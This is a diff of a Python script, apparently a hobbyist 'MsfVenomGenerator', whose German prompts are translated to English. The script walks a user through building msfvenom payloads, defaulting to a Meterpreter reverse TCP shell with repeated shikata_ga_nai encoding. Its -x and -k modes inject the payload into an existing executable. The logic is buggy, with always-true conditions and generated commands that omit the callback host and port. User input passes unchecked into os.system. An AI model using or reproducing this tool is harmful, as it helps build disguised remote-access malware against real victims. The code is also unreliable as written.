@@ -17,7 +17,7 @@ os.system("apt-get install gedit")
 os.system("clear")
 print(" " + bcolors.HEADER)
 if os.getuid() != 0:
-    exit("Dieses Tool muss als Root ausgeführt werden!")
+    exit("This tool must be executed as Root")
 print("                                                                   __     _______ _   _  ___  __  __ ")
 print("                                                                   \ \   / / ____| \ | |/ _ \|  \/  |")
 print("                                                                    \ \ / /|  _| |  \| | | | | |\/| |")
@@ -26,47 +26,47 @@ print("                                                                      \_/
 print(bcolors.UNDERLINE + "                                                                                   ___________________________________________________________________________________________" + bcolors.ENDC)
 print(" ")
 print(" ")
-print(bcolors.OKBLUE + "MsfVenomGenerator von" + bcolors.WARNING + " DasPinguinHD")
+print(bcolors.OKBLUE + "MsfVenomGenerator by" + bcolors.WARNING + " DasPinguinHD")
 print(" ")
-print("PROFI-TIPP: Du kannst die Datei badchars.txt bearbeiten und so deine Ausgabedatei personalisieren!" + bcolors.ENDC)
+print("PRO-TIP: You can edit the badchars.txt file to personalize your Payload" + bcolors.ENDC)
 print(" ")
 print(" ")
 print(" ")
-input("Eingabetaste zum Starten")
+input("Press enter to start")
 os.system("clear")
 
 
 try:
-    print("Lass uns zuerst deine IP festlegen. Gib hier deine Ausgangsadresse ein (Wenn dein Angriff über ein lokales Netzwerk geht, brauchst du deine lokale IP) (Gib zum Anzeigen deiner lokalen IP show IP ein): ")
+    print("Let's set your IP-Address. You'll most likely be using this tool in a local network, so you'll need your local IP-Address. If you want to see your local IP, type 'show IP' ")
     while True:
         lhost = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
         if lhost == "show IP":
             os.system("ifconfig")
-            print("Deine benötigte IP-Adresse ist die unter deinem WLAN-Interface, also zum Beispiel wlan0 unter inet: XXX.XXX.XX.XXX. Wird dir kein Interface mit 'wlan' angezeigt, hast du entweder nur Ethernet, also Kabel-Anschluss, oder keinen Internetzugang")
+            print("Your Wifi-Interface might be called something like wlan0 or wlan1. You'll need the inet: XXX.XXX.XX.XXX. If you don't see a WiFi-Interface, you might have a cable connection or simply no internet")
         elif lhost == "":
-            print("Bitte eine gültige Ip eingeben!")
+            print("Please enter a valid IP")
         else:
             break
 
-    print("Als nächstest brauchst du noch einen lokalen Port (Standardmäßig: 4444)")
+    print("Now set your port. If you press enter, it'll be 4444")
 
     while True:
         lport= input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
         if lport == "":
             lport = "4444"
-
+            break
 
         else:
             try:
                 val1 = int(lport)
-                print("Erfolgreich")
+                print("Success")
                 break
             except ValueError:
-                print("Falscher input")
+                print("Wrong input")
 
 
-    print("Dein Port wurde festgelegt.")
-    print("Jetzt brauchst du einen Payload. Gib show payloads für eine Liste verfügbarer Payloads ein oder gib deinen Payload gleich so ein: ")
+    print("Your port has been set.")
+    print("Now you'll need a payload. If you want a list of available payloads, type 'show payloads'. Or just simply enter your payload . If you press enter, your Payload will be: windows/meterpreter/reverse_tcp.")
     while True:
         print("Payload:")
         payload = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
@@ -74,17 +74,19 @@ try:
             os.system("msfvenom --list payloads")
 
         elif payload == "":
-            print("Gib einen Payload ein!")
+            print("payload set: windows/meterpreter/reverse_tcp.")
+            payload = "windows/meterpreter/reverse_tcp"
+            break
         else:
-            print("Fertig")
+            print("Done")
             break
 
 
-    print("Dein Payload wurde aufgenommen!")
+    print("Your payload has been registered")
 
-    print("Encodiere deinen Payload nun: ")
+    print("Now it's time to encode your payload: ")
 
-    print("show encoders zeigt dir eine Liste mit verfügbaren Encodieren an, Standardmäßig ist shikata_ga_nai eingestellt. ")
+    print("show encoders will show you a list of enocoders. If you press enter, it'll be set to x86/shikata_ga_nai. ")
     while True:
         encoder = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
         if encoder == "":
@@ -94,17 +96,17 @@ try:
         elif encoder == "show encoders":
             os.system("msfvenom --list encoders")
         else:
-            print("Encodierer gesetzt")
+            print("Encoder set")
             break
 
-    print("Gib jetzt an, wie oft der Payload encodiert werden soll (Standardmäßig 4): ")
+    print("Now enter how many times your payload should be encoded (Iterations). If you press enter, you'll have 4 Itertions. ")
     iteration = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
     if iteration == "":
         iteration = "4"
     else:
-        print("Iterations gesetzt")
+        print("Iterations set")
     while True:
-        print("Gib jetzt an, wie viele Bad-Chars dein Payload haben soll: ")
+        print("Now enter how many Bad-Chars you want: ")
         print("1,2,3,4")
         bchar = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
         if bchar == "1":
@@ -134,53 +136,70 @@ try:
 
     print(str(badchar))
 
-    print("Gib jetzt o, x oder k ein, um den Modus deiner Ausgabedatei festzulegen: ")
+    print("Now enter o, x or k, to set the 'Mode' of the output file: ")
     while True:
         file = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
         if file == "o":
             x = "-o"
             print("Normal-Out")
             print(" ")
-            print("Gib jetzt einen Dateinamen mit Pfad ein (/home/USERNAME/DATEINAME) BITTE OHNE DIE DATEIENDUNG: ")
+            print("Now enter a path, beginning at / (/home/USERNAME/FILENAME e. g.) Don't enter the suffix (exe, txt e. g.): ")
             template = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
-            print("Gib jetzt eine Dateiendung ein, welche zum OS deines Payloads passt (z. B.: exe oder txt bei Windows) (Bitte OHNE Punkt, also exe oder txt, nicht .exe): ")
+            print("Now enter a suffix, which matches to your target Payload and/or OS (e. g.: exe oder txt on Windows) (ENTER WITHOUT THE DOT! Don't enter .exe, rather enter exe): ")
             suffix = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
             break
         if file == "x":
-            x = "x"
-            print("Vorlage als Output")
-            print("Bitte beim Verzeichnis '/' anfangen, also falls die Datei in deinem persönlichen Ordner ist: /home/USERNAME/template.exe")
+            x = "-x"
+            print("Template as Output")
+            print("Enter an executable file as template. Start at the root directory '/'. For example if your template is here: enter this: /home/USERNAME/template.exe")
             template = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
-            print("Gib die Dateiendung der Vorlage ein (OHNE Punkt): ")
-            suffix = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
+            print("Now enter a Name for your output (Such as: /home/USER/test1) (without the suffix): ")
+            output1 = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
+            print("Now enter the suffix (such as exe or txt e. g.)")
+            output2 = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
+
             break
         if file == "k":
             x = "-k"
-            print("Code-Injection in eine vorhandene Datei")
+            print("Code-Injection into an existing file")
             print(" ")
-            print("")
+            print("Enter the path to the file, but don't enter the suffix of the file (like exe). Start from the root directory. ")
             template = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
-            print("Gib jetzt die Endung der Vorlage ein (OHNE Punkt): ")
+            print("Now enter the suffix of your file ")
             suffix = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
             break
 
         if file != "o" or "x" or "k":
-            print("Falsche Angabe!")
-    print("Fertig, Code wird generiert...")
+            print("Wrong input!")
+    print("Done, generating code...")
 
-    outcmd = input("Willst du die Datei gleich generieren? Ansonsten wird dir der Befehl zum Selbstausführen angezeigt (J/n): ")
+    outcmd = input("Do you want to execute the command now or just show it? (E/s): ")
     while True:
-        if outcmd == "J":
-            print("msfvenom -p " + str(payload) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
-            os.system("msfvenom -p " + str(payload) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
-            break
-        elif outcmd == "n":
-                print("Code zum Kopieren: msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport="+ str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
+        if outcmd == "E":
+            if file == "x":
+                msfcode = "msfvenom -p " + str(payload) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + " -o " + str(output1) + "." + str(output2)
+                print("Executing... " + str(msfcode))
+                os.system(str(msfcode))
                 break
-        else:
-            print(bcolors.WARNING + "Ungültiger Wert, nochmal versuchen." + bcolors.ENDC)
+            if file == "o" or "k":
+                print("Executing... msfvenom -p " + str(payload) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
+                os.system("msfvenom -p " + str(payload) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
+                break
+
+        elif outcmd == "s":
+            try:
+                if file == "x":
+                    print("Your code: msfvenom -p " + str(payload) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + " -o " + str(output1) + "." + str(output2))
+                    break
+                if file == "o" or "k":
+                    print(" Your code: msfvenom -p " + str(payload) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
+                    break
+                else:
+                    print(bcolors.WARNING + "invalid input, try again." + bcolors.ENDC)
+            except Exception as e:
+                print(str(e) + "Procceding anyway...")
 except KeyboardInterrupt:
     print(" ")
-    print(bcolors.WARNING + "Beenden" + bcolors.ENDC)
+    print(bcolors.WARNING + "Shutdown... Goodbye" + bcolors.ENDC)
 except Exception as e:
-    print("Ein Fehler ist aufgetreten:" + str(e))
+    print("An error occured:" + str(e))
